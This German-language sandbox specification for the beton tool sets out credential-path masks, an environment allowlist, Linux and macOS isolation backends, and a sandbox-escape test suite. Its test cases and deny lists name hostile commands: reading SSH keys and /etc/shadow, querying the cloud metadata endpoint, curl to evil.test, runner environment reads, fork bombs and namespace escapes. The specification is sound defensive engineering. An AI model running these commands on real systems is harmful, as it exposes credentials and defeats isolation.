- **Beschreibung:** Die YAML-Konfiguration (siehe Design) wird mit JSON-Schema validiert, über Ebenen gemergt und zu einer `ResolvedPolicy` aufgelöst. Pfade werden nur mit `~` expandiert (keine `$VAR`-Expansion), kanonisiert und gegen verbotene Wurzeln geprüft. Der Workspace (bzw. Worktree inkl. `<repo>/.git/worktrees/<name>` und Objekt-DB) ist implizit Read-/Write-Root.
- **Details:** Verbotene Grants (Fehler, nicht still ignoriert): `/`, `~` als `write_paths`, `~/.beton`, `~/.ssh`, das Docker-Socket, Pfade unter `/proc`, `/sys`. `read_paths: ["~"]` ist erlaubt, unterliegt aber den Default-Masken. Symlinks in Grants werden aufgelöst; zeigt das Ziel in eine verbotene Wurzel → Fehler `PathEscape`. Ebenfalls verboten: Vorfahren von `~` als Grant (nur `~` selbst, damit die Dotfile-Masken greifen), `~/Library/LaunchAgents` und seine Vorfahren als `write_paths`, `..` in Pfaden. Lexikalische Verbote prüft schon das Laden (`invalid_spec` mit Feld, z. B. `sandbox.write_paths[0]`), kanonische die Auflösung; ein Datei-Grant mit mehreren Hardlinks ist `PathEscape`. Nicht vorhandene Grants werden nicht freigegeben, `explain` zeigt sie als Hinweis. Worktree: Schreib-Wurzeln sind `<repo>/.git/worktrees/<name>` sowie `objects`, `refs` und `logs` des Repos, das Repo-`.git` ist lesbar; das Layout gilt nur, wenn `.git` → gitdir, dessen `gitdir` → `.git` und `commondir` → Repo übereinstimmen (ein gefälschtes `.git` gibt nichts frei). Read-only bleiben `hooks/`, `config`, `config.worktree` und Submodul-Hooks; `<workspace>/.git` lässt sich weder ersetzen noch umbenennen.
- **Akzeptanzkriterien:**
  - [ ] AC1 — `write_paths: ["~"]` wird beim Laden mit `InvalidSpec` und Pfadangabe abgelehnt.
  - [ ] AC2 — `read_paths: ["~/link"]` mit `~/link → ~/.ssh` liefert `PathEscape`.
  - [ ] AC3 — `read_paths: ["$HOME/x"]` wird nicht expandiert und als relativer Pfad abgelehnt.
  - [ ] AC4 — Ein Tool kann in `<repo>/.git/hooks/pre-commit` nicht schreiben, wohl aber Commits erzeugen (`git commit` im Worktree gelingt).
  - [ ] AC5 — `beton sandbox explain` gibt die aufgelöste Policy (Roots, Masken, Env-Namen ohne Werte, Regeln) aus.
- **Abhängigkeiten:** SBX-001, SES-015 (siehe 07-sessions-collaboration.md)

### SBX-004 — Default-Masken für Dotfiles & Credential-Pfade
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Innerhalb freigegebener Wurzeln werden Credential- und Konfigurationsdateien maskiert, damit z. B. `read_paths: ["~"]` nicht `~/.ssh` exponiert. Dotfiles direkt in Grants werden standardmäßig maskiert, außer sie stehen in `allow_hidden`. Im Workspace selbst bleiben Dotfiles sichtbar (`.github`, `.gitignore` …), außer den Mustern aus `masks` (Default `.env`, `.env.*`).
- **Details:** Default-Masken (Stufe 1 und 2): `~/.ssh`, `~/.aws`, `~/.azure`, `~/.config/gcloud`, `~/.config/gh`, `~/.config/glab-cli`, `~/.netrc`, `~/.git-credentials`, `~/.docker/config.json`, `~/.kube`, `~/.gnupg`, `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials*`, `~/.beton`, `~/Library/Keychains` (macOS), `$XDG_RUNTIME_DIR`. Zusätzlich in Stufe 2: alle `credential_paths` und State-Dirs aller Adapter. Linux: Masken über Mount-Namespace (tmpfs bzw. Bind von `/dev/null`); ohne Mount-NS Grant-Expansion (Geschwister einzeln freigeben). macOS: SBPL-Deny-Regeln nach den Allow-Regeln; Vorfahren einer Maske innerhalb von Schreib-Wurzeln dürfen weder umbenannt noch gelöscht werden (`file-write-unlink`), sonst ließe sich die Maske durch Umbenennen eines Elternverzeichnisses umgehen. Masken sind Pfade (`~/…`, `/…`; bei Symlinks zusätzlich das kanonische Ziel) oder Namensmuster mit `*`/`?` aus genau einem Segment, die im Workspace und in allen Grant-Wurzeln in jeder Tiefe gelten; ein Muster mit `/` wäre durch Umbenennen umgehbar und ist ein Konfigurationsfehler. `masks` ersetzt den Workspace-Default `[.env, .env.*]`, ein gleichnamiger `allow_hidden`-Eintrag hebt ein Muster auf; Default-Masken gewinnen immer (auch gegen `allow_hidden`). Ein Grant innerhalb einer Maske ist `PathEscape`. In Stufe 1 mit `keychain: true` entfällt die Maske `~/Library/Keychains`.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Mit `read_paths: ["~"]` scheitert `cat ~/.ssh/id_ed25519` (Fixture) in Stufe 1 und 2; `ls ~/Documents` gelingt.
  - [ ] AC2 — `cat .env` im Workspace scheitert bei Default-Konfiguration; mit `masks: []` *und* `allow_hidden: [.env]` gelingt es.
  - [ ] AC3 — In Stufe 2 ist `~/.codex/auth.json` nicht lesbar, in Stufe 1 einer Codex-Session schon.
  - [ ] AC4 — Eine Maske ist nicht durch Umbenennen/Hardlink des Elternverzeichnisses aus der Sandbox heraus umgehbar (Escape-Test).
- **Abhängigkeiten:** SBX-003

### SBX-005 — Environment deny-by-default
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Sandbox-Prozesse erben kein Environment. beton baut es explizit: Basis (`PATH`, `HOME`, `USER`, `LOGNAME`, `SHELL`, `TERM`, `LANG`, `LC_*`, `TZ`, `TMPDIR`=Scratch), Proxy- und CA-Variablen (PRX-008), Session-Marker (`BETON_SESSION_ID`, `BETON_STAGE`), in Stufe 1 die Harness-Familie des Adapters (z. B. `ANTHROPIC_*`, `CLAUDE_*` bzw. `OPENAI_*`, `CODEX_HOME`), plus `env.passthrough` und `env.set`. Platzhalter-Variablen kommen aus `credentials[].env`.
- **Details:** Immer entfernt, auch bei Passthrough: `SSH_AUTH_SOCK`, `DBUS_SESSION_BUS_ADDRESS` (Stufe 2; Stufe 1 nur bei `keychain: true`), `XDG_RUNTIME_DIR` (ersetzt durch Scratch), `BETON_TOKEN`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*`. Von beton je Stufe gesetzt und weder per `env.set` noch `env.passthrough` (Konfigurationsfehler) noch über den Exec-Broker änderbar: `HOME`, `TMPDIR`, `XDG_RUNTIME_DIR`, `BETON_*` (u. a. `BETON_STAGE`, `BETON_SESSION_ID`, in Stufe 1 `BETON_EXEC_SOCKET`/`BETON_EXEC_TOKEN`), Proxy- und CA-Variablen (PRX-008). Werte werden nie über argv übergeben (sichtbar in `/proc/*/cmdline`), sondern per Env des Kindprozesses bzw. FD.
  *Umsetzung (M2):* Der Runner erbt aus dem Daemon nur seine Allowlist plus die Namen aus `env.passthrough` (Muster gegen die Umgebung des Daemons, nie gesperrte oder `BETON_*`); die Auflösung baut daraus das Environment jeder Stufe. `credentials[].env` sind Namen (keine Muster), nicht gesperrt, nicht von beton gesetzt, je Session nur einem Credential zugeordnet und nicht zugleich in `env.set` (Konfigurationsfehler mit Feld, z. B. `credentials[0].env[0]`); eine Quellvariable `source.env` darf nicht in `env.passthrough` stehen (auch nicht über ein Muster), sonst käme der echte Wert unter ihrem Namen in die Sandbox (Fehler bei `credentials[i].source.env`); aus dem Host-Environment kommen nur die Locale-Kategorien, nicht beliebige `LC_*`-Namen; ihr Platzhalter gewinnt gegen `env.passthrough` und die Harness-Familie, damit ein durchgereichter echter Wert nie neben dem Binding steht. Was Stufe 1 an Stufe 2 weitergeben darf, regelt die Allowlist von `bt-exec` (SBX-002, #259).
- **Akzeptanzkriterien:**
  - [ ] AC1 — Given `AWS_SECRET_ACCESS_KEY=x` im Daemon-Env, then ist die Variable in Stufe 1 und 2 nicht gesetzt (`env` im Tool).
  - [ ] AC2 — `env.passthrough: ["SSH_AUTH_SOCK"]` wird mit Konfigurationsfehler abgelehnt.
  - [ ] AC3 — `GH_TOKEN` in Stufe 2 hat einen Wert mit Präfix `bt_cred_` und nie den echten Token.
  - [ ] AC4 — `/proc/<pid>/cmdline` des Sandbox-Launchers enthält keine Secret-Werte oder Proxy-Tokens (Linux-Test).
- **Abhängigkeiten:** SBX-003, PRX-006

### SBX-006 — Fail-closed: verlangt, aber nicht verfügbar → Fehler
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Fehlt eine geforderte Capability, startet die Session nicht; es gibt keinen stillen Fallback auf unsandboxed oder schwächere Backends. Default ist „Sandbox erforderlich“ für alle Harness-Sessions. Unsandboxed geht nur mit `backend: none`, das in UI/CLI einmal pro Session bestätigt werden muss und per Policy verboten werden kann. YOLO-Mode (`permission_mode: yolo`: keine Vendor-Rückfragen, beton-Policies gelten weiter; HAR-027 in 01-harnesses.md) ist ohne aktive Sandbox nicht startbar.
- **Details:** Fehler-Problem: `{code: "sandbox_unavailable", provider, missing: ["net"], hint: "Kernel ≥ 5.19 mit Landlock oder backend: docker"}`. Verliert eine laufende Session ihre Sandbox-Voraussetzung (z. B. Proxy-Absturz), werden neue Tool-Ausführungen abgelehnt und die Session pausiert.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Given Linux ohne Landlock und ohne bwrap, when `beton run claude` mit Default-Config, then Exit-Code ≠ 0 mit `sandbox_unavailable` und es wurde kein Harness-Prozess gestartet.
  - [ ] AC2 — `permission_mode: yolo` zusammen mit `backend: none` wird beim Session-Start abgelehnt.
  - [ ] AC3 — Wird der Proxy-Prozess während einer Session beendet, scheitert der nächste Netzwerkzugriff aus Stufe 2 (kein Direktzugriff), und die Session geht in `paused` mit Event `sandbox.violation {kind: "proxy_down"}`.
  - [ ] AC4 — Eine Org-/User-Policy `sandbox.backend != "none"` verhindert `backend: none` auch bei expliziter Bestätigung.
- **Abhängigkeiten:** SBX-001, PRX-001, POL-024 (siehe 03-policies.md), HAR-027 (siehe 01-harnesses.md)
- **Referenz:** ADR-0007; Omnigent „Fehler statt unsandboxed“

### SBX-007 — macOS-Backend: Seatbelt (SBPL, deny-default)
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Prozesse werden über `/usr/bin/sandbox-exec -f <profil>` gestartet. Das Profil wird pro Spawn aus einem versionierten Template generiert: `(version 1) (deny default)`, minimale System-Lese-Pfade, Prozess-/Signal-Rechte nur auf den eigenen Baum, Read/Write-Roots, Masken als nachgestellte Deny-Regeln, Netzwerk ausschließlich `localhost:<proxy-port>`. Pfade gehen als Profil-Parameter (`-D KEY=VALUE`) ein, nie per String-Konkatenation ins SBPL.
- **Details:** Stufe 1 mit `keychain: true` erhält die für Keychain-Zugriff nötigen Mach-Services (`com.apple.SecurityServer`, `com.apple.securityd*`); Stufe 2 nie. `~/Library` ist außer explizit freigegebenen Unterpfaden gesperrt. DNS-Dienst (`com.apple.dnssd.service`, mDNSResponder) ist gesperrt — Namensauflösung erfolgt im Proxy. Das Profil geht als Argument (`sandbox-exec -p`) statt als Datei an `sandbox-exec`: Den Scratch kann eine laufende Sandbox beschreiben und so das Profil eines späteren Starts austauschen. Profil plus Parameter höchstens 256 KiB. `process-info*` ist trotz `(deny default)` erlaubt, solange es nicht ausdrücklich verboten ist; das Profil verbietet es und erlaubt nur den eigenen Baum (`same-sandbox`), sonst läse ein Tool über `sysctl(KERN_PROCARGS2)` argv und Environment aller Prozesse des Benutzers (Gegenstück zu `/proc/<pid>/environ`). `sysctl-read` nur für benannte Werte (kein Präfix `kern.`). Kein `bind`/`listen`, keine Unix-Sockets, Mach-Services nur für Benutzer-Auflösung, Benachrichtigungen und Logging; setuid-Binaries startet Seatbelt nicht. Die Probe ist ein Selbsttest (ein verbotener Lesezugriff muss scheitern); läuft beton selbst in einer Sandbox, ist das Backend `unavailable`. Da `sandbox-exec` von Apple als deprecated markiert ist, prüft `beton doctor` die Funktionsfähigkeit bei jedem macOS-Update (Escape-Suite in CI auf aktuellen macOS-Versionen).
- **Akzeptanzkriterien:**
  - [ ] AC1 — In Stufe 2 scheitert `security find-generic-password -s "Claude Code-credentials"`; in Stufe 1 (Claude-Adapter) funktioniert die Authentifizierung des CLIs.
  - [ ] AC2 — `curl https://example.com` ohne Proxy-Env (`env -u HTTPS_PROXY`) scheitert mit Verbindungsfehler; mit Proxy und passender Regel gelingt es.
  - [ ] AC3 — Ein Workspace-Pfad mit `"`, `)` oder Zeilenumbruch im Namen erzeugt ein gültiges, nicht manipulierbares Profil (Fuzz-Test des Profil-Generators).
  - [ ] AC4 — Schreiben nach `~/Library/LaunchAgents/x.plist` und `~/.zshrc` scheitert in beiden Stufen.
  - [ ] AC5 — Verbindung zu einem auf `127.0.0.1:<anderer Port>` lauschenden Host-Dienst scheitert.
- **Abhängigkeiten:** SBX-001, SBX-004, PRX-008
- **Referenz:** Omnigent `seatbelt_sandbox.py` (3.5.3)

### SBX-008 — Linux-Backend: Landlock + seccomp + Namespaces
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Nativ in Rust (Crates `landlock`, `seccompiler`, `libc`), ohne externes Binary. Der Launcher (`beton __sandbox-exec`) erzeugt unprivilegiert User-, Mount-, PID-, Net-, IPC- und UTS-Namespaces, richtet Masken und privates `/tmp` ein, startet im Net-NS einen Relay (`127.0.0.1:<Proxy-Port>` → Proxy), setzt `PR_SET_NO_NEW_PRIVS`, wendet Landlock-Regeln an, lädt den seccomp-Filter und führt das Ziel als Kind von PID 1 (Reaper) aus. Stirbt der Runner, beendet der Launcher die Sandbox.
- **Details:** seccomp-Denylist (EPERM): `mount`/`umount2`/`pivot_root`/`chroot`/neue Mount-API (`fsopen`, `fsmount`, `fsconfig`, `fspick`, `move_mount`, `open_tree`, `mount_setattr`), `unshare`, `setns`, `ptrace`, `process_vm_readv/writev`, `pidfd_getfd`, `bpf`, `perf_event_open`, `userfaultfd`, `kexec*`, `init_module`/`finit_module`/`delete_module`, `keyctl`/`add_key`/`request_key`, `io_uring_*`, `open_by_handle_at`/`name_to_handle_at`, `reboot`, `swapon/off`, Uhr-Setzen, `acct`, `quotactl`, `syslog`, `vhangup`, `sethostname`/`setdomainname`, auf x86_64 `iopl`/`ioperm`/`modify_ldt`/`uselib`; `ioctl(TIOCSTI|TIOCLINUX)` (keine Eingaben ins Terminal des Benutzers); `socket` nur `AF_UNIX`/`AF_INET`/`AF_INET6`; `clone` mit `CLONE_NEW*` → EPERM, `clone3` → ENOSYS (glibc fällt auf `clone` zurück). Compat-ABIs: Ein Syscall mit fremder Architektur (i386 per `int 0x80`) beendet den Prozess, x32-Syscalls → EPERM; 32-Bit-Programme laufen in der Sandbox daher nicht.
  - *Ablauf:* Der Runner startet `beton __sandbox-exec` ohne Environment; Plan (Programm, argv, Environment, Wurzeln, Masken, Netz, Limits) kommt als JSON über eine Pipe (FD 3), Rückmeldungen (`ready`, `failed {step}`, `limit {target}`) über einen `SOCK_SEQPACKET`-Socket (FD 4). Weder argv noch Environment des Launchers tragen Werte (SBX-005 AC4). Jeder Fehler vor dem `execve` des Ziels ist `spawn_failed` mit dem Schritt (`user-namespace`, `mount`, `landlock`, `seccomp`, `exec` …), das Ziel läuft dann nie. Der Launcher (L) bleibt außerhalb, wartet und erkennt das Ende des Runners am Schließen des Status-Sockets (nicht per `PR_SET_PDEATHSIG`, das schon beim Ende des startenden Threads auslöst); dann beendet er PID 1 und damit den ganzen PID-Namespace (AC6). PID 1 ist Reaper; endet das Ziel, endet die Sandbox mit allen Hintergrundprozessen. Exit-Code bzw. Signal des Ziels werden durchgereicht.
  - *Mounts:* `/` rekursiv privat, frisches `/proc` des PID-Namespace (Runner und andere Prozesse unsichtbar), eigene PTY-Instanz, privates tmpfs für `/tmp`, `/run` (Docker-, D-Bus- und Agent-Sockets, `$XDG_RUNTIME_DIR`) und `/dev/shm`. Masken: Verzeichnisse als leeres, schreibgeschütztes tmpfs mit Modus 0000, Dateien als darübergebundene leere Datei mit Modus 0000 (Lesen scheitert); Muster und Dotfiles in Grants werden beim Start gesucht (#212). Wurzeln unter einem tmpfs oder einer Dotfile-Maske werden danach wieder eingebunden (Reihenfolge nach Pfadtiefe); unter `/tmp` und `/run` bekommen sie eine eigene, am Ende read-only Zwischenebene, damit neben ihnen nichts entsteht, das wie ein Teil des Hosts aussieht. Landlock gibt das private `/tmp` frei und wertet den Zugriffspfad aus; für dort wieder eingebundene Wurzeln schützen deshalb ihre read-only-Mounts. Mountpunkte lassen sich weder umbenennen noch hart verlinken; Vorfahren von Masken innerhalb von Schreib-Wurzeln werden deshalb als Mountpunkte gebunden (Gegenstück zu den KEEP-Regeln unter macOS, SBX-004 AC4), sonst fände der nächste Start eine verschobene Datei unmaskiert. Git: `hooks/`, `config`, `config.worktree`, Submodul-Hooks und bei Worktrees `commondir`/`gitdir` read-only gebunden, `.git` als eigener Mount (nicht ersetzbar); fehlt `hooks/`, legt beton es vor dem Start an. Eine nicht vorhandene Maske in einer Schreib-Wurzel (z. B. `~/.docker/config.json` bei `write_paths: [~/.docker]`) darf nicht entstehen: Ihr tiefster vorhandener Vorfahre ist dann nur lesbar (read-only gebunden und per Landlock-Grant-Expansion), seine vorhandenen Einträge sind einzeln beschreibbar; neue Einträge direkt darin sind gesperrt.
  - *Landlock:* `HardRequirement` mit allen Dateisystem-Rechten der Kernel-ABI außer `IOCTL_DEV`; System lesen/ausführen (`/usr`, `/bin`, `/sbin`, `/lib*`, `/etc`, `/proc`, `/sys/devices/system/cpu`), Geräte `/dev/null`, `/dev/zero`, `/dev/full`, `/dev/{u,}random`, `/dev/tty`, `/dev/ptmx`, `/dev/pts`, dazu `/tmp`, `/dev/shm`, Lese- und Schreib-Wurzeln. Ab ABI 9 Verbindungen zu Unix-Sockets mit Pfad nur in `/tmp` und Scratch. Capabilities: Bounding-Menge, Ambient und `capset` leer, `SECBIT_NOROOT` (auch UID 0 im eigenen User-Namespace bekommt über `execve` nichts zurück); rlimits laut SBX-013, keine Core-Dumps.
  - *Netz:* Der Relay lauscht im leeren Net-NS auf `127.0.0.1:<Proxy-Port>`, damit dieselbe Proxy-URL innen wie außen gilt. Er selbst erreicht nichts; je Verbindung reicht ihm ein Connector im Host-Netz (Kind von L vor `unshare`, verbindet ausschließlich zu `127.0.0.1:<Proxy-Port>`) den Socket per `SCM_RIGHTS`. Relay und Connector laufen ohne Dateizugriff (Landlock) mit demselben seccomp-Filter. Ohne Proxy gibt es keinen Relay und kein Netz. Ein Unix-Socket des Proxys (#191) kann den Connector später ersetzen.
  - *Kernel-Matrix (Plan, umgesetzt mit WP-48 #171):* Der CI-Job „test (linux, ohne Netzwerk)“ läuft auf dem Kernel der GitHub-Runner (Ubuntu 24.04, ABI ≥ 4) und deckt AC4 per ABI-2-Emulation ab (Landlock auf die Rechte von ABI 2 begrenzt, seccomp-Sperre aktiv). Echte Kernel prüft die VM-Matrix aus SBX-011.
  Kernel-Anforderungen und Fallback:

| Bedingung | Verhalten |
| --- | --- |
| Landlock nicht aktiv (Kernel < 5.13 oder fehlt in `lsm=`) bzw. ABI 1 (5.13–5.18) | Backend nicht verfügbar, auch bwrap (SBX-009 wendet Landlock ebenfalls an) → Fehler mit Hinweis auf Kernel ≥ 5.19 bzw. `backend: docker` (M5); `beton doctor` meldet `fail` |
| ABI 2 (Kernel 5.19–6.1) | unterstützt; `truncate(2)` zusätzlich per seccomp gesperrt (Truncate-Kontrolle fehlt) |
| ABI ≥ 3 (≥ 6.2) | voll unterstützt (Mindestempfehlung) |
| ABI ≥ 4 (≥ 6.7) | zusätzlich Landlock-TCP-Regeln als Defense-in-Depth: `connect` nur zum Relay-Port und zu `dev_ports`, `bind` nur auf `dev_ports` (#210; im leeren Net-NS erreichen beide nur Dienste der Sandbox selbst) |
| ABI ≥ 6 (≥ 6.12) | zusätzlich Scoping für Signale und abstrakte Unix-Sockets |
| Unprivilegierte User-NS gesperrt (`unprivileged_userns_clone=0`, `max_user_namespaces=0`, AppArmor-Restriktion) | Netz- und Masken-Isolation nicht möglich → SBX-009 (bwrap) oder Fehler; die Probe nennt den sysctl als Grund und den Fallback. deb/rpm-Pakete liefern das AppArmor-Profil `deploy/apparmor/beton` für `/usr/bin/beton` mit `userns`-Recht (M3) |
| seccomp-Filter nicht verfügbar | Fehler |

- **Akzeptanzkriterien:**
  - [ ] AC1 — Auf Kernel ≥ 6.2: `cat /etc/shadow`, `echo x > /etc/beton-test`, `cat ~/.ssh/id_ed25519` scheitern in Stufe 2; Schreiben im Workspace gelingt.
  - [ ] AC2 — In Stufe 2 scheitert jede TCP-/UDP-Verbindung außer zum Relay (z. B. `nc 1.1.1.1 53`, `curl --noproxy '*' https://example.com`); der Net-NS enthält nur `lo`.
  - [ ] AC3 — `unshare -r`, `mount -t tmpfs`, `strace -p <runner-pid>` und `kill -9 <runner-pid>` scheitern aus der Sandbox.
  - [ ] AC4 — Auf Debian 12 (Kernel 6.1, ABI 2) läuft die Sandbox, und `truncate -s0 <read-only-Datei>` scheitert.
  - [ ] AC5 — Auf Ubuntu 24.04 mit AppArmor-Userns-Restriktion und installiertem Paketprofil funktioniert das Backend; ohne Profil meldet `beton sandbox probe` den Grund und den Fallback.
  - [ ] AC6 — Nach Beenden des Runners (SIGKILL) existiert binnen 1 s kein Prozess der Sandbox mehr.
- **Abhängigkeiten:** SBX-001, SBX-004, PRX-008
- **Referenz:** ADR-0007; Omnigent bwrap/seccomp (3.5.3), dort ohne Landlock

### SBX-009 — Linux-Fallback: bubblewrap
- **Meilenstein:** M2 · **Priorität:** Should
- **Beschreibung:** Sind unprivilegierte User-Namespaces nicht verfügbar, aber ein (setuid- oder per AppArmor erlaubtes) `bwrap` ≥ 0.8 installiert, nutzt beton bwrap für Namespaces und Mounts und wendet Landlock und seccomp danach im eigenen Launcher innerhalb von bwrap an. Explizit wählbar mit `backend: bwrap`.
- **Details:** bwrap nur von festen Orten (`/usr/bin/bwrap`, `/usr/local/bin/bwrap`), Version per `bwrap --version`; verfügbar erst nach bestandenem Selbsttest. Argumente: `--die-with-parent`, `--unshare-{user-try,ipc,pid,net,uts,cgroup-try}`, `--ro-bind / /`, eigenes `/dev` und `/proc`, dieselben tmpfs, Masken, Wiedereinbindungen und Git-Mounts wie SBX-008 (Datei-Masken binden eine leere Datei mit Modus 0000 aus einem privaten Temp-Verzeichnis des Launchers), Schreib-Wurzeln als `--bind`; danach nur `-- <beton> __sandbox-exec`. Der Plan mit Environment geht über eine Pipe an den inneren Launcher; bwrap startet mit leerem Environment. Ohne eigenen User-Namespace (setuid-bwrap) zählt `RLIMIT_NPROC` alle Prozesse des Benutzers; das `pids`-Limit gilt dann zusätzlich zu den schon laufenden. `auto` wählt bwrap nur, wenn `landlock` nicht nutzbar ist.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Mit `kernel.unprivileged_userns_clone=0` und installiertem bwrap wählt `auto` das Backend `bwrap`, und die Escape-Suite (SBX-011) besteht vollständig.
  - [ ] AC2 — Ein bwrap < 0.8 wird als „nicht verfügbar“ mit Versionshinweis gemeldet.
  - [ ] AC3 — bwrap-Argumente enthalten keine Env-Werte (kein `--setenv` für Secrets/Platzhalter-Zuordnungen).
- **Abhängigkeiten:** SBX-008

### SBX-010 — Capability-Probe & `beton sandbox`-CLI
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** `beton sandbox probe|explain|exec|test` macht den Sandbox-Zustand transparent: Probe der Backends (Kernel/Landlock-ABI, User-NS, seccomp, bwrap, `sandbox-exec`, Docker/Podman), Ausgabe der aufgelösten Policy, manuelles Ausführen eines Kommandos in Stufe 1/2 und Lauf der Escape-Suite auf dem lokalen System. `beton doctor` (OBS-005, siehe 11-platform-features.md) bindet die Probe ein.
- **Akzeptanzkriterien:**
  - [ ] AC1 — `beton sandbox probe --json` liefert pro Backend `available`, `caps`, `degraded_reasons` und (Linux) `landlock_abi`, `kernel`.
  - [ ] AC2 — `beton sandbox exec --stage tools -- cat ~/.ssh/config` scheitert mit Exit ≠ 0 und klarer Meldung.
  - [ ] AC3 — `beton sandbox test` führt die Escape-Suite lokal aus und endet mit Exit 0 nur, wenn alle Pflichtfälle bestanden sind.
- **Abhängigkeiten:** SBX-001, SBX-011, OBS-005 (siehe 11-platform-features.md)

### SBX-011 — Sandbox-Escape-Testsuite
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Eine deklarative Testsuite (`crates/beton-sandbox/tests/escape/*.yaml`) führt einen Probe-Binary (`bt-escape-probe`) in beiden Stufen aus und erwartet für jeden Angriff ein Scheitern. Sie läuft in CI pro OS (macOS arm64 aktuell und Vorversion; Ubuntu 22.04, Ubuntu 24.04 mit AppArmor-Restriktion, Debian 12, Fedora aktuell; Windows-Beta-Teilmenge ab M5; Docker ab M5) mit gefälschtem `HOME` voller Fixture-Secrets. Fehlschläge blockieren den Merge. SBX-011 ist Owner von Suite, Probe-Binary und Plattform-Matrix; Einbindung als Required Check und Reporting regelt QA-005.
- **Details:** Kernel-Matrix für Linux (Plan aus WP-41, umgesetzt in WP-48 #171): Container teilen den Kernel des Hosts, deshalb laufen Debian 12 (Kernel 6.1, ABI 2), Ubuntu 22.04 (5.15, ABI 1: Backends müssen `unavailable` melden), Ubuntu 24.04 mit AppArmor-Restriktion und Fedora aktuell (ABI ≥ 6) als VMs mit KVM auf den Linux-Runnern (`/dev/kvm`, QEMU). Die Cloud-Images sind über Prüfsumme festgelegt und im Actions-Cache abgelegt; die VM startet ohne Netzwerkkarte, bekommt Test-Binaries und Fixtures über ein Laufwerk und schreibt den JUnit-Report zurück. Jede VM prüft ihre erwartete Landlock-ABI (QA-005 AC3) und scheitert, statt Fälle zu überspringen. Die neuen Jobs werden als Required Checks mit WP-48 eingeführt.
  Pflichtfälle (Auszug): `~/.ssh/id_ed25519` lesen; `~/.aws/credentials` lesen; Vendor-Credential in Stufe 2 lesen; `/etc` schreiben; außerhalb Workspace schreiben; `.git/hooks` schreiben; Symlink im Workspace auf `~/.ssh` lesen; `/proc/<runner>/environ` lesen; Env auf Secrets prüfen; `curl https://evil.test` (Regel fehlt); `curl http://169.254.169.254/`; Direktverbindung an LAN-IP ohne Proxy; DNS-Rebinding-Host (Test-Resolver liefert erst öffentliche, dann `127.0.0.1`); Platzhalter an fremden Host; Keychain/Secret-Service in Stufe 2; ptrace/kill des Runners; Fork-Bombe (Limit greift); Docker-Socket; `mount`/`unshare`.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Die CI-Matrix enthält die oben genannten Plattformen; jeder Pflichtfall erscheint als eigener Testfall im Report.
  - [ ] AC2 — Ein absichtlich gelockertes Profil (Test-Fixture ohne Maske für `~/.ssh`) lässt den zugehörigen Fall rot werden (Mutationstest der Suite).
  - [ ] AC3 — Fixture-Secrets tauchen in keinem CI-Log und keinem Session-Event auf (Grep auf Testartefakte).
  - [ ] AC4 — Neue Backends gelten erst als verfügbar, wenn sie die Suite (bzw. die dokumentierte Teilmenge bei Beta) bestehen.
- **Abhängigkeiten:** SBX-002, SBX-004, SBX-005, SBX-007, SBX-008, PRX-003, PRX-006, PRX-007, QA-005, QA-010 (siehe 12-distribution-quality.md)
- **Referenz:** ADR-0031 (Sandbox-Escape-Tests pro OS)

### SBX-012 — Eingebaute Presets
- **Meilenstein:** M2 · **Priorität:** Should
- **Beschreibung:** Presets liefern sinnvolle Startpunkte: `default` (Workspace rw, kein Netz außer Stufe-1-Vendor-Hosts), `dev` (zusätzlich lesender Zugriff auf gängige Paket-Registries und Toolchain-Caches), `readonly` (Workspace ro, kein Netz für die Tools; Stufe 1 erreicht weiter nur ihre Vendor-Hosts; z. B. für Side-Chats und Reviewer-Agents). Eigene Felder überschreiben bzw. ergänzen Presets gemäß Merge-Regeln.
- **Details:** Ein Preset liegt direkt unter der spezifischsten Ebene, die eins setzt (nur dieses gilt): Es überschreibt weniger spezifische Ebenen (ein `readonly` des Agents verschärft, was der Benutzer freigibt, auch `write_paths`), die eigenen Felder dieser Ebene überschreiben es; die Auflösung wendet es selbst an, damit es nie still entfällt. `default`: Workspace `rw`, Netz nur über den Proxy, in Stufe 2 keine Egress-Regel. `dev`: wie `default` plus `GET,HEAD` auf `registry.npmjs.org`, `registry.yarnpkg.com`, `pypi.org`, `files.pythonhosted.org`, `index.crates.io`, `static.crates.io`, `proxy.golang.org`, `sum.golang.org`, `codeload.github.com`, `objects.githubusercontent.com` und Schreib-Grants (also auch Lesen) für `~/.cargo/registry`, `~/.npm`, `~/.cache/pip`, `~/go/pkg/mod` *(korrigiert: `~/.npm` statt `~/.npm/_cacache`, weil npm dort auch Logs schreibt; fehlende Caches werden übersprungen)*. `readonly`: Workspace `ro`, `allow_network: false`. `explain` nennt je Feld die Herkunft (`preset:<name>` bzw. die Ebene), bei vereinigten Listen je Eintrag.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Mit `preset: dev` gelingt `npm install` eines öffentlichen Pakets; `npm publish` scheitert (PUT nicht erlaubt). (Test gegen eine lokale Registry-Attrappe, ADR-0033.)
  - [ ] AC2 — Mit `preset: readonly` scheitert jedes Schreiben im Workspace.
  - [ ] AC3 — `beton sandbox explain` zeigt, welche Werte aus dem Preset und welche aus eigener Konfiguration stammen.
- **Abhängigkeiten:** SBX-003, PRX-003

### SBX-013 — Ressourcenlimits & Prozessbaum-Lebenszyklus
- **Meilenstein:** M2 · **Priorität:** Should
- **Beschreibung:** Sandbox-Prozessbäume sind begrenzbar (Speicher, Prozessanzahl, CPU-Zeit, Dateigröße) und werden bei Session-Ende, Interrupt-Eskalation oder Runner-Absturz vollständig beendet. Linux nutzt cgroup v2 über systemd-User-Delegation, falls verfügbar, sonst rlimits; PID-Namespace garantiert das Aufräumen. macOS nutzt rlimits und Prozessgruppen-/Nachfahren-Erfassung.
